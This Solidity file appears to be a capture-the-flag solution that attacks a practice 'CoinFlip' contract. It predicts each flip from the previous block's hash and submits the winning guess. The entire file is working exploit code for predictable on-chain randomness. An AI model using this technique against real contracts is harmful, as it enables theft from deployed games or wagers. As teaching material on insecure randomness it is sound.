// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {
    // Create state variable to represent CoinFlip contract + FACTOR.
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Initialize the target CoinFlip address...

    // We are not using <new> before CoinFlip because we want to interact with the existing contract, not a new instance of it.
    constructor(address _victimContractAddress) public {
        victimContract = CoinFlip(_victimContractAddress);
    }

    // Flip functionality to memic the target contracts answer.
    function flip() public returns (bool) {
        // Get blockhash of previous block, then convert it to integer (uint256).
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // Take blockValue and divide it by the random seed FACTOR to increase "randomness".
        uint256 coinFlip = uint256(blockValue/FACTOR);
        // Return true if the CoinFlip value equals 1, otherwhise it returns false.
        bool side = coinFlip == 1 ? true : false;

        // Call flip function on the victim contract and pass our guess (e.g. side).
        victimContract.flip(side);
    }
}
